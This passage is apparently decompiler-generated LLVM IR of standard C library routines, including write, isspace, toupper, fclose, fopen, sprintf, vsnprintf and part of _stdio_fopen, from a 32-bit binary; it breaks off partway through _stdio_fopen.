define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e0a8 = load i32, i32* @edi, align 4
  store i32 %v0_804e0a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e0b8 = load i32, i32* @ebx, align 4
  %v4_804e0c0 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804e0b8, i32* @ebx, align 4
  store i32 %v4_804e0c0, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804e0c0, -4095
  br i1 %tmp, label %dec_label_pc_804e0d8, label %dec_label_pc_804e0cc

dec_label_pc_804e0cc:                             ; preds = %entry
  %v1_804e0cc = call i32 @__errno_location(i32 %v0_804e0b8)
  %v0_804e0d1 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e0d1 = sub i32 0, %v0_804e0d1
  %v2_804e0d3 = inttoptr i32 %v1_804e0cc to i32*
  store i32 %v1_804e0d1, i32* %v2_804e0d3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e0d8

dec_label_pc_804e0d8:                             ; preds = %entry, %dec_label_pc_804e0cc
  %v0_804e0d9 = phi i32 [ %v4_804e0c0, %entry ], [ -1, %dec_label_pc_804e0cc ]
  %v2_804e0d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e0d8, i32* @edx, align 4
  %v2_804e0dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e0dc, i32* @edi, align 4
  ret i32 %v0_804e0d9

; uselistorder directives
  uselistorder i32 %v4_804e0c0, { 1, 0, 2 }
  uselistorder i32 %v0_804e0b8, { 1, 0 }
  uselistorder label %dec_label_pc_804e0d8, { 1, 0 }
}

define i32 @isspace(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804e0e4 = load i32, i32* inttoptr (i32 134587448 to i32*), align 8
  %v2_804e0e9 = mul i32 %arg1, 2
  %v3_804e0e9 = add i32 %v0_804e0e4, %v2_804e0e9
  %v4_804e0e9 = inttoptr i32 %v3_804e0e9 to i16*
  %v5_804e0e9 = load i16, i16* %v4_804e0e9, align 2
  %v6_804e0e9 = zext i16 %v5_804e0e9 to i32
  %v1_804e0ed = and i32 %v6_804e0e9, 32
  ret i32 %v1_804e0ed
}

define i32 @__GI_toupper(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_804e0f8 = add i32 %arg1, 128
  %v6_804e103 = icmp ugt i32 %v1_804e0f8, 383
  br i1 %v6_804e103, label %dec_label_pc_804e10e, label %dec_label_pc_804e105

dec_label_pc_804e105:                             ; preds = %entry
  %v0_804e105 = load i32, i32* inttoptr (i32 134587456 to i32*), align 64
  %v2_804e10a = mul i32 %arg1, 2
  %v3_804e10a = add i32 %v0_804e105, %v2_804e10a
  %v4_804e10a = inttoptr i32 %v3_804e10a to i16*
  %v5_804e10a = load i16, i16* %v4_804e10a, align 2
  %v6_804e10a = sext i16 %v5_804e10a to i32
  store i32 %v6_804e10a, i32* @edx, align 4
  br label %dec_label_pc_804e10e

dec_label_pc_804e10e:                             ; preds = %entry, %dec_label_pc_804e105
  %v0_804e10e = phi i32 [ %arg1, %entry ], [ %v6_804e10a, %dec_label_pc_804e105 ]
  ret i32 %v0_804e10e

; uselistorder directives
  uselistorder label %dec_label_pc_804e10e, { 1, 0 }
}

define i32 @__errno_location(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_8060940.157 to i32)
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804e11c = load i32, i32* @ebp, align 4
  %v0_804e11d = load i32, i32* @edi, align 4
  %v0_804e11e = load i32, i32* @esi, align 4
  %v0_804e11f = load i32, i32* @ebx, align 4
  %v4_804e123 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e123, i32* @esi, align 4
  %v1_804e127 = add i32 %v4_804e123, 52
  %v2_804e127 = inttoptr i32 %v1_804e127 to i32*
  %v3_804e127 = load i32, i32* %v2_804e127, align 4
  store i32 %v3_804e127, i32* @ebp, align 4
  %v1_804e12a = icmp eq i32 %v3_804e127, 0
  %v1_804e12c = icmp eq i1 %v1_804e12a, false
  br i1 %v1_804e12c, label %dec_label_pc_804e14d, label %dec_label_pc_804e12e

dec_label_pc_804e12e:                             ; preds = %entry
  %v1_804e12e = add i32 %v4_804e123, 56
  store i32 %v1_804e12e, i32* @ebx, align 4
  %v2_804e138 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e138, i32* @eax, align 4
  %v2_804e13d = call i32 @__pthread_return_void(i32 %v2_804e138, i32 134552291)
  %v0_804e142 = load i32, i32* @ebx, align 4
  %v1_804e145 = call i32 @__pthread_return_0(i32 %v0_804e142)
  store i32 %v1_804e145, i32* @eax, align 4
  %v0_804e14f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e14d

dec_label_pc_804e14d:                             ; preds = %entry, %dec_label_pc_804e12e
  %v0_804e157 = phi i32 [ %v4_804e123, %entry ], [ %v0_804e14f.pre, %dec_label_pc_804e12e ]
  store i32 0, i32* @edi, align 4
  %v1_804e14f = inttoptr i32 %v0_804e157 to i8*
  %v2_804e14f = load i8, i8* %v1_804e14f, align 1
  %v3_804e14f = and i8 %v2_804e14f, 64
  %v4_804e14f = icmp eq i8 %v3_804e14f, 0
  br i1 %v4_804e14f, label %dec_label_pc_804e14d.dec_label_pc_804e162_crit_edge, label %dec_label_pc_804e154

dec_label_pc_804e14d.dec_label_pc_804e162_crit_edge: ; preds = %dec_label_pc_804e14d
  br label %dec_label_pc_804e162

dec_label_pc_804e154:                             ; preds = %dec_label_pc_804e14d
  %v1_804e158 = inttoptr i32 %v0_804e157 to i16*
  %v2_804e158 = call i32 @fflush_unlocked(i16* %v1_804e158)
  store i32 %v2_804e158, i32* @edi, align 4
  %v0_804e165.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e162

dec_label_pc_804e162:                             ; preds = %dec_label_pc_804e14d.dec_label_pc_804e162_crit_edge, %dec_label_pc_804e154
  %v0_804e165 = phi i32 [ %v0_804e157, %dec_label_pc_804e14d.dec_label_pc_804e162_crit_edge ], [ %v0_804e165.pre, %dec_label_pc_804e154 ]
  %v1_804e165 = add i32 %v0_804e165, 4
  %v2_804e165 = inttoptr i32 %v1_804e165 to i32*
  %v3_804e165 = load i32, i32* %v2_804e165, align 4
  %v1_804e168 = call i32 @__libc_close(i32 %v3_804e165)
  %v0_804e170 = load i32, i32* @esi, align 4
  %v1_804e170 = add i32 %v0_804e170, 4
  %v2_804e170 = inttoptr i32 %v1_804e170 to i32*
  store i32 -1, i32* %v2_804e170, align 4
  %v2_804e181 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804e181, i32* @ebx, align 4
  %v2_804e186 = icmp slt i32 %v1_804e168, 0
  store i32 -1, i32* @eax, align 4
  %v1_804e18d = load i32, i32* @edi, align 4
  %v3_804e18d = select i1 %v2_804e186, i32 -1, i32 %v1_804e18d
  store i32 %v3_804e18d, i32* @edi, align 4
  %v2_804e190 = call i32 @__pthread_return_void(i32 %v2_804e181, i32 134552291)
  %v1_804e19c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a474.158 to i32))
  %v0_804e1a1 = load i32, i32* @global_var_805e704.159, align 4
  %v1_804e1a6 = add i32 %v0_804e1a1, 1
  store i32 %v1_804e1a6, i32* @global_var_805e704.159, align 4
  store i32 ptrtoint (i32* @global_var_805a474.158 to i32), i32* @eax, align 4
  %v2_804e1b1 = call i32 @__pthread_return_void(i32 %v2_804e181, i32 1)
  %v0_804e1b6 = load i32, i32* @esi, align 4
  %v1_804e1b6 = inttoptr i32 %v0_804e1b6 to i32*
  %v2_804e1b6 = load i32, i32* %v1_804e1b6, align 4
  %v1_804e1bb = and i32 %v2_804e1b6, 24576
  %v1_804e1c0 = or i32 %v1_804e1bb, 48
  store i32 %v1_804e1c0, i32* @eax, align 4
  %v1_804e1c5 = trunc i32 %v1_804e1c0 to i16
  %v3_804e1c5 = inttoptr i32 %v0_804e1b6 to i16*
  store i16 %v1_804e1c5, i16* %v3_804e1c5, align 2
  br i1 %v1_804e12c, label %dec_label_pc_804e1db, label %dec_label_pc_804e1ca

dec_label_pc_804e1ca:                             ; preds = %dec_label_pc_804e162
  %v2_804e1ce = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804e1ce, i32* @eax, align 4
  %v2_804e1d3 = call i32 @__pthread_return_void(i32 %v2_804e1ce, i32 1)
  store i32 %v2_804e1d3, i32* @eax, align 4
  br label %dec_label_pc_804e1db

dec_label_pc_804e1db:                             ; preds = %dec_label_pc_804e162, %dec_label_pc_804e1ca
  %v0_804e1db = load i32, i32* @esi, align 4
  %v1_804e1db = add i32 %v0_804e1db, 1
  %v2_804e1db = inttoptr i32 %v1_804e1db to i8*
  %v3_804e1db = load i8, i8* %v2_804e1db, align 1
  %v4_804e1db = and i8 %v3_804e1db, 64
  %v5_804e1db = icmp eq i8 %v4_804e1db, 0
  br i1 %v5_804e1db, label %dec_label_pc_804e1ef, label %dec_label_pc_804e1e1

dec_label_pc_804e1e1:                             ; preds = %dec_label_pc_804e1db
  %v1_804e1e4 = add i32 %v0_804e1db, 8
  %v2_804e1e4 = inttoptr i32 %v1_804e1e4 to i32*
  %v3_804e1e4 = load i32, i32* %v2_804e1e4, align 4
  %v1_804e1e7 = call i32 @free(i32 %v3_804e1e4)
  store i32 %v1_804e1e7, i32* @eax, align 4
  br label %dec_label_pc_804e1ef

dec_label_pc_804e1ef:                             ; preds = %dec_label_pc_804e1db, %dec_label_pc_804e1e1
  %v2_804e1fb = call i32 @__pthread_return_void(i32 %v2_804e181, i32 134552291)
  %v1_804e207 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a474.158 to i32))
  store i32 ptrtoint (i32* @global_var_805a474.158 to i32), i32* @eax, align 4
  %v0_804e20d = load i32, i32* @global_var_805e708.160, align 8
  %v1_804e20d = add i32 %v0_804e20d, 1
  store i32 %v1_804e20d, i32* @global_var_805e708.160, align 8
  %v2_804e217 = call i32 @__pthread_return_void(i32 %v2_804e181, i32 1)
  %v0_804e21c = call i32 @_stdio_openlist_dec_use()
  %v0_804e224 = load i32, i32* @edi, align 4
  store i32 %v0_804e11f, i32* @ebx, align 4
  store i32 %v0_804e11e, i32* @esi, align 4
  store i32 %v0_804e11d, i32* @edi, align 4
  store i32 %v0_804e11c, i32* @ebp, align 4
  ret i32 %v0_804e224

; uselistorder directives
  uselistorder i32 %v2_804e181, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_804e1ef, { 1, 0 }
  uselistorder label %dec_label_pc_804e1db, { 1, 0 }
  uselistorder label %dec_label_pc_804e162, { 1, 0 }
  uselistorder label %dec_label_pc_804e14d, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_804e23b = inttoptr i32 %arg2 to i8*
  %v5_804e23b = call i32 @_stdio_fopen(i32 %arg1, i8* %v4_804e23b, i32 0, i32 -1)
  ret i32 %v5_804e23b
}

define i32 @sprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v2_804e247 = ptrtoint i32* %stack_var_12 to i32
  %v4_804e25a = inttoptr i32 %arg1 to i8*
  %v5_804e25a = call i32 @__GI_vsnprintf(i8* %v4_804e25a, i32 -1, i32 %arg2, i32 %v2_804e247)
  ret i32 %v5_804e25a
}

define i32 @__GI_vsnprintf(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e264 = load i32, i32* @ebp, align 4
  %v0_804e265 = load i32, i32* @edi, align 4
  %v0_804e266 = load i32, i32* @esi, align 4
  %v0_804e267 = load i32, i32* @ebx, align 4
  store i32 %v0_804e267, i32* %stack_var_-16, align 4
  %v4_804e26b = ptrtoint i8* %arg1 to i32
  store i32 %v4_804e26b, i32* @esi, align 4
  %v2_804e26f = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804e27a = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804e27a, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804e294 = sub i32 -1, %v4_804e26b
  %v1_804e2a7 = call i32 @__stdio_init_mutex(i32 %v2_804e26f)
  %v1_804e2b7 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804e294, %v1_804e2b7
  %v5_804e2b9 = select i1 %tmp, i32 %v1_804e294, i32 %v1_804e2b7
  store i32 %v5_804e2b9, i32* @ebx, align 4
  %v0_804e2bc = load i32, i32* @esi, align 4
  %v3_804e2e6 = inttoptr i32 %arg3 to i8*
  %v4_804e2e6 = call i32 @_vfprintf_internal(i32 %v2_804e27a, i8* %v3_804e2e6, i32 %arg4)
  %v1_804e2ee = icmp eq i32 %v5_804e2b9, 0
  store i32 %v4_804e2e6, i32* @edx, align 4
  br i1 %v1_804e2ee, label %dec_label_pc_804e30a, label %dec_label_pc_804e303

dec_label_pc_804e303:                             ; preds = %entry
  %stack_var_-80.0 = inttoptr i32 %v0_804e2bc to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804e30d.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e30a

dec_label_pc_804e30a:                             ; preds = %entry, %dec_label_pc_804e303
  %v0_804e30d = phi i32 [ %v4_804e2e6, %entry ], [ %v0_804e30d.pre, %dec_label_pc_804e303 ]
  %v2_804e30f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e30f, i32* @ebx, align 4
  store i32 %v0_804e266, i32* @esi, align 4
  store i32 %v0_804e265, i32* @edi, align 4
  store i32 %v0_804e264, i32* @ebp, align 4
  ret i32 %v0_804e30d

; uselistorder directives
  uselistorder i32 %v1_804e2b7, { 1, 0 }
  uselistorder i32 %v1_804e294, { 1, 0 }
  uselistorder label %dec_label_pc_804e30a, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e314 = load i32, i32* @ebp, align 4
  %v0_804e315 = load i32, i32* @edi, align 4
  %v0_804e316 = load i32, i32* @esi, align 4
  %v0_804e317 = load i32, i32* @ebx, align 4
  store i32 %v0_804e317, i32* %stack_var_-16, align 4
  %v4_804e31b = ptrtoint i8* %arg2 to i32
  store i32 %v4_804e31b, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804e32b = load i8, i8* %arg2, align 1
  %v3_804e32b = zext i8 %v2_804e32b to i32
  %v4_804e32b = load i32, i32* @eax, align 4
  %v5_804e32b = and i32 %v4_804e32b, -256
  %v6_804e32b = or i32 %v5_804e32b, %v3_804e32b
  store i32 %v6_804e32b, i32* %eax.global-to-local, align 4
  %v10_804e32d = icmp eq i8 %v2_804e32b, 114
  br i1 %v10_804e32d, label %dec_label_pc_804e36f, label %dec_label_pc_804e331

dec_label_pc_804e331:                             ; preds = %entry
  %v10_804e331 = icmp eq i8 %v2_804e32b, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804e331, label %dec_label_pc_804e371, label %dec_label_pc_804e33a

dec_label_pc_804e33a:                             ; preds = %dec_label_pc_804e331
  %v10_804e33a = icmp eq i8 %v2_804e32b, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804e33a, label %dec_label_pc_804e371, label %dec_label_pc_804e342

dec_label_pc_804e342:                             ; preds = %dec_label_pc_804e3ea, %dec_label_pc_804e3c4, %dec_label_pc_804e33a
  %v0_804e342 = load i32, i32* %stack_var_-16, align 4
  %v1_804e342 = call i32 @__errno_location(i32 %v0_804e342)
  store i32 %v1_804e342, i32* %eax.global-to-local, align 4
  %v0_804e347 = load i32, i32* @ebp, align 4
  %v1_804e347 = icmp eq i32 %v0_804e347, 0
  %v1_804e349 = inttoptr i32 %v1_804e342 to i32*
  store i32 22, i32* %v1_804e349, align 4
  br i1 %v1_804e347, label %dec_label_pc_804e54b, label %dec_label_pc_804e355

dec_label_pc_804e355:                             ; preds = %dec_label_pc_804e40d, %dec_label_pc_804e342
  %v0_804e355 = load i32, i32* @ebp, align 4
  %v1_804e355 = add i32 %v0_804e355, 1
  %v2_804e355 = inttoptr i32 %v1_804e355 to i8*
  %v3_804e355 = load i8, i8* %v2_804e355, align 1
  %v4_804e355 = and i8 %v3_804e355, 32
  %v5_804e355 = icmp eq i8 %v4_804e355, 0
  br i1 %v5_804e355, label %dec_label_pc_804e54b, label %dec_label_pc_804e35f

dec_label_pc_804e35f:                             ; preds = %dec_label_pc_804e355
  store i32 %v0_804e355, i32* %stack_var_-76, align 4
  store i32 0, i32* @ebp, align 4
  %v1_804e365 = call i32 @free(i32 %v0_804e355)
  br label %dec_label_pc_804e546

dec_label_pc_804e36f:                             ; preds = %entry
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804e371

dec_label_pc_804e371:                             ; preds = %dec_label_pc_804e33a, %dec_label_pc_804e331, %dec_label_pc_804e36f
  %v0_804e382 = phi i32 [ 1089, %dec_label_pc_804e33a ], [ 577, %dec_label_pc_804e331 ], [ 0, %dec_label_pc_804e36f ]
  %v1_804e371 = add i32 %v4_804e31b, 1
  %v2_804e371 = inttoptr i32 %v1_804e371 to i8*
  %v3_804e371 = load i8, i8* %v2_804e371, align 1
  %v12_804e371 = icmp eq i8 %v3_804e371, 98
  %v1_804e371.v4_804e31b = select i1 %v12_804e371, i32 %v1_804e371, i32 %v4_804e31b
  store i32 %v1_804e371.v4_804e31b, i32* %eax.global-to-local, align 4
  %v1_804e37c = add i32 %v1_804e371.v4_804e31b, 1
  %v2_804e37c = inttoptr i32 %v1_804e37c to i8*
  %v3_804e37c = load i8, i8* %v2_804e37c, align 1
  %v12_804e37c = icmp eq i8 %v3_804e37c, 43
  %v1_804e380 = icmp eq i1 %v12_804e37c, false
  br i1 %v1_804e380, label %dec_label_pc_804e38a, label %dec_label_pc_804e382

dec_label_pc_804e382:                             ; preds = %dec_label_pc_804e371
  %v1_804e384 = or i32 %v0_804e382, 1
  store i32 %v1_804e384, i32* %eax.global-to-local, align 4
  %v1_804e387 = add nuw nsw i32 %v1_804e384, 1
  store i32 %v1_804e387, i32* @ebx, align 4
  br label %dec_label_pc_804e38a

dec_label_pc_804e38a:                             ; preds = %dec_label_pc_804e371, %dec_label_pc_804e382
  %v0_804e40d7 = phi i32 [ %v0_804e382, %dec_label_pc_804e371 ], [ %v1_804e387, %dec_label_pc_804e382 ]
  %v1_804e38a = icmp eq i32 %arg3, 0
  %v1_804e38c = icmp eq i1 %v1_804e38a, false
  br i1 %v1_804e38c, label %dec_label_pc_804e3c0, label %dec_label_pc_804e38e

dec_label_pc_804e38e:                             ; preds = %dec_label_pc_804e38a
  store i32 80, i32* %stack_var_-76, align 4
  %v1_804e393 = call i32 @malloc(i32 80)
  store i32 %v1_804e393, i32* %eax.global-to-local, align 4
  %v2_804e39b = icmp eq i32 %v1_804e393, 0
  store i32 %v1_804e393, i32* @ebp, align 4
  br i1 %v2_804e39b, label %dec_label_pc_804e54d, label %dec_label_pc_804e3a5

dec_label_pc_804e3a5:                             ; preds = %dec_label_pc_804e38e
  %v2_804e393 = inttoptr i32 %v1_804e393 to i16*
  store i16 8192, i16* %v2_804e393, align 2
  %v2_804e3ad = add i32 %v1_804e393, 8
  %v3_804e3ad = inttoptr i32 %v2_804e3ad to i32*
  store i32 0, i32* %v3_804e3ad, align 4
  %v2_804e3b4 = add i32 %v1_804e393, 56
  store i32 %v2_804e3b4, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3b4, i32* %stack_var_-76, align 4
  %v1_804e3b8 = call i32 @__stdio_init_mutex(i32 %v2_804e3b4)
  store i32 %v1_804e3b8, i32* %eax.global-to-local, align 4
  %v0_804e40d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e3c0

dec_label_pc_804e3c0:                             ; preds = %dec_label_pc_804e38a, %dec_label_pc_804e3a5
  %v2_804e413 = phi i32 [ %v0_804e40d7, %dec_label_pc_804e38a ], [ %v0_804e40d.pre, %dec_label_pc_804e3a5 ]
  %v2_804e3c0 = icmp slt i32 %arg4, 0
  br i1 %v2_804e3c0, label %dec_label_pc_804e40d, label %dec_label_pc_804e3c4

dec_label_pc_804e3c4:                             ; preds = %dec_label_pc_804e3c0
  %v1_804e3c6 = and i32 %v2_804e413, 32771
  %v1_804e3cc = add nuw nsw i32 %v1_804e3c6, 1
  store i32 %v1_804e3cc, i32* @edx, align 4
  %v0_804e3cd = load i32, i32* @esi, align 4
  %v1_804e3cd = add i32 %v0_804e3cd, 1
  %v2_804e3d0 = and i32 %v1_804e3cd, %v1_804e3cc
  store i32 %v2_804e3d0, i32* %eax.global-to-local, align 4
  %v12_804e3d2 = icmp eq i32 %v2_804e3d0, %v1_804e3cc
  %v1_804e3d4 = load i32, i32* @ebp, align 4
  %v2_804e3d4 = add i32 %v1_804e3d4, 4
  %v3_804e3d4 = inttoptr i32 %v2_804e3d4 to i32*
  store i32 %arg4, i32* %v3_804e3d4, align 4
  %v1_804e3d7 = icmp eq i1 %v12_804e3d2, false
  br i1 %v1_804e3d7, label %dec_label_pc_804e342, label %dec_label_pc_804e3dd

dec_label_pc_804e3dd:                             ; preds = %dec_label_pc_804e3c4
  %v0_804e3dd = load i32, i32* @esi, align 4
  %v1_804e3df = and i32 %v0_804e3dd, 1024
  %v1_804e3e1 = xor i32 %v1_804e3df, 1024
  store i32 %v1_804e3e1, i32* %eax.global-to-local, align 4
  %v1_804e3e6 = load i32, i32* @ebx, align 4
  %v2_804e3e6 = and i32 %v1_804e3e6, %v1_804e3e1
  %v3_804e3e6 = icmp eq i32 %v2_804e3e6, 0
  br i1 %v3_804e3e6, label %dec_label_pc_804e3dd.dec_label_pc_804e403_crit_edge, label %dec_label_pc_804e3ea

dec_label_pc_804e3dd.dec_label_pc_804e403_crit_edge: ; preds = %dec_label_pc_804e3dd
  br label %dec_label_pc_804e403

dec_label_pc_804e3ea:                             ; preds = %dec_label_pc_804e3dd
  store i32 %arg4, i32* %stack_var_-76, align 4
  %v3_804e3f3 = call i32 @__libc_fcntl(i32 %arg4, i32 4, i32 1024)
  store i32 %v3_804e3f3, i32* %eax.global-to-local, align 4
  %v1_804e3fb = icmp eq i32 %v3_804e3f3, 0
  %v1_804e3fd = icmp eq i1 %v1_804e3fb, false
  br i1 %v1_804e3fd, label %dec_label_pc_804e342, label %dec_label_pc_804e3ea.dec_label_pc_804e403_crit_edge

dec_label_pc_804e3ea.dec_label_pc_804e403_crit_edge: ; preds = %dec_label_pc_804e3ea
  %v0_804e403.pre = load i32, i32* @esi, align 4
  %v0_804e409.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e403

dec_label_pc_804e403:                             ; preds = %dec_label_pc_804e3dd.dec_label_pc_804e403_crit_edge, %dec_label_pc_804e3ea.dec_label_pc_804e403_crit_edge
  %v0_804e409 = phi i32 [ %v1_804e3e6, %dec_label_pc_804e3dd.dec_label_pc_804e403_crit_edge ], [ %v0_804e409.pre, %dec_label_pc_804e3ea.dec_label_pc_804e403_crit_edge ]
  %v0_804e403 = phi i32 [ %v0_804e3dd, %dec_label_pc_804e3dd.dec_label_pc_804e403_crit_edge ], [ %v0_804e403.pre, %dec_label_pc_804e3ea.dec_label_pc_804e403_crit_edge ]
  %v1_804e403 = and i32 %v0_804e403, 32768
  %v2_804e409 = or i32 %v1_804e403, %v0_804e409
  store i32 %v2_804e409, i32* @ebx, align 4
  br label %dec_label_pc_804e431

dec_label_pc_804e40d:                             ; preds = %dec_label_pc_804e3c0
  %v11_804e40f = or i32 %v2_804e413, 32768
  store i32 %v11_804e40f, i32* %eax.global-to-local, align 4
  %v1_804e412 = add i32 %arg4, 1
  %v8_804e412 = icmp eq i32 %v1_804e412, 0
  store i32 %v1_804e412, i32* @edi, align 4
  %v1_804e413 = icmp eq i1 %v8_804e412, false
  %v4_804e413 = select i1 %v1_804e413, i32 %v11_804e40f, i32 %v2_804e413
  store i32 %v4_804e413, i32* @ebx, align 4
  %v0_804e41d = load i32, i32* @esi, align 4
  store i32 %v0_804e41d, i32* %stack_var_-76, align 4
  %v3_804e41e = inttoptr i32 %v0_804e41d to i8*
  %v4_804e41e = call i32 @__libc_open(i8* %v3_804e41e, i32 %v4_804e413)
  store i32 %v4_804e41e, i32* %eax.global-to-local, align 4
  %v2_804e426 = icmp slt i32 %v4_804e41e, 0
  %v1_804e428 = load i32, i32* @ebp, align 4
  %v2_804e428 = add i32 %v1_804e428, 4
  %v3_804e428 = inttoptr i32 %v2_804e428 to i32*
  store i32 %v4_804e41e, i32* %v3_804e428, align 4
  br i1 %v2_804e426, label %dec_label_pc_804e355, label %dec_label_pc_804e431

dec_label_pc_804e431:                             ; preds = %dec_label_pc_804e40d, %dec_label_pc_804e403
  %v0_804e431 = load i32, i32* @ebp, align 4
  %v1_804e431 = inttoptr i32 %v0_804e431 to i32*
  %v2_804e431 = load i32, i32* %v1_804e431, align 4
  %v2_804e431.tr = trunc i32 %v2_804e431 to i16
  %v1_804e439 = and i16 %v2_804e431.tr, 8192
  %v3_804e439 = inttoptr i32 %v0_804e431 to i16*
  store i16 %v1_804e439, i16* %v3_804e439, align 2
  %v0_804e43d = load i32, i32* @ebx, align 4
  store i32 %v0_804e43d, i32* %eax.global-to-local, align 4
  %v1_804e43f = and i32 %v0_804e43d, -31744
  %v0_804e445 = load i32, i32* @ebp, align 4
  %v1_804e445 = inttoptr i32 %v0_804e445 to i32*
  %v2_804e445 = load i32, i32* %v1_804e445, align 4
  %v1_804e448 = mul i32 %v0_804e43d, 16
  %v1_804e44b = and i32 %v1_804e448, 48
  %v1_804e44c = add nuw nsw i32 %v1_804e44b, 16
  %v2_804e44f = xor i32 %v1_804e44c, 48
  %v2_804e452 = or i32 %v2_804e445, %v1_804e43f
  %v2_804e454 = or i32 %v2_804e452, %v2_804e44f
  store i32 %v2_804e454, i32* %eax.global-to-local, align 4
  %v1_804e456 = trunc i32 %v2_804e454 to i16
  %v3_804e456 = inttoptr i32 %v0_804e445 to i16*
  store i16 %v1_804e456, i16* %v3_804e456, align 2
  %v0_804e45a = load i32, i32* %stack_var_-76, align 4
  %v1_804e45a = call i32 @__errno_location(i32 %v0_804e45a)
  store i32 %v1_804e45a, i32* %eax.global-to-local, align 4
  %v0_804e462 = load i32, i32* @ebp, align 4
  %v1_804e462 = inttoptr i32 %v0_804e462 to i16*
  %v2_804e462 = load i16, i16* %v1_804e462, align 2
  %v3_804e462 = zext i16 %v2_804e462 to i32
  store i32 %v3_804e462, i32* @ebx, align 4
  %v1_804e466 = inttoptr i32 %v1_804e45a to i32*
  %v2_804e466 = load i32, i32* %v1_804e466, align 4
  store i32 %v2_804e466, i32* @edi, align 4
  store i32 %v1_804e45a, i32* @esi, align 4
  %v1_804e46a = add i32 %v0_804e462, 4
  %v2_804e46a = inttoptr i32 %v1_804e46a to i32*
  %v3_804e46a = load i32, i32* %v2_804e46a, align 4
  store i32 %v3_804e46a, i32* %stack_var_-76, align 4
  %v1_804e46d = call i32 @isatty(i32 %v3_804e46a)
  %v2_804e475 = mul i32 %v1_804e46d, 256
  store i32 %v2_804e475, i32* %eax.global-to-local, align 4
  %v0_804e478 = load i32, i32* @ebx, align 4
  %v2_804e478 = or i32 %v0_804e478, %v2_804e475
  store i32 %v2_804e478, i32* @ebx, align 4
  %v1_804e47a = trunc i32 %v2_804e478 to i16
  %v2_804e47a = load i32, i32* @ebp, align 4
  %v3_804e47a = inttoptr i32 %v2_804e47a to i16*
  store i16 %v1_804e47a, i16* %v3_804e47a, align 2
  %v0_804e47e = load i32, i32* @edi, align 4
  %v1_804e47e = load i32, i32* @esi, align 4
  %v2_804e47e = inttoptr i32 %v1_804e47e to i32*
  store i32 %v0_804e47e, i32* %v2_804e47e, align 4
  %v0_804e480 = load i32, i32* @ebp, align 4
  %v1_804e480 = add i32 %v0_804e480, 8
  %v2_804e480 = inttoptr i32 %v1_804e480 to i32*
  %v3_804e480 = load i32, i32* %v2_804e480, align 4
  %v4_804e480 = icmp eq i32 %v3_804e480, 0
  %v1_804e484 = icmp eq i1 %v4_804e480, false
  br i1 %v1_804e484, label %dec_label_pc_804e4b8, label %dec_label_pc_804e486

dec_label_pc_804e486:                             ; preds = %dec_label_pc_804e431
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_804e48e = call i32 @malloc(i32 4096)
  store i32 %v1_804e48e, i32* %eax.global-to-local, align 4
  %v1_804e496 = icmp eq i32 %v1_804e48e, 0
  %v1_804e498 = load i32, i32* @ebp, align 4
  %v2_804e498 = add i32 %v1_804e498, 8
  %v3_804e498 = inttoptr i32 %v2_804e498 to i32*
  store i32 %v1_804e48e, i32* %v3_804e498, align 4
  br i1 %v1_804e496, label %dec_label_pc_804e4b1, label %dec_label_pc_804e49d

